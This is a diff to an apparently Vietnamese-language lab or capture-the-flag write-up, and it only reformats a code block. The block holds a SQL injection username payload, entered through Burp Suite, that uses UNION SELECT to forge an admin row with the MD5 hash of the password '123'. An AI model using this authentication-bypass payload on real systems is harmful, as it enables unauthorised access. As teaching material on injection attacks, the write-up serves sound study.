@@ -56,7 +56,9 @@ và 1 mật khẩu đã được mã hóa md5
  
 Sau đó vào Burp Suite, chỉnh giá trị username như sau:
 
-```abc") UNION SELECT 'admin', '202cb962ac59075b964b07152d234b70'-```
+```
+abc") UNION SELECT 'admin', '202cb962ac59075b964b07152d234b70'-
+```
 
 Password cung cấp: `123`
 
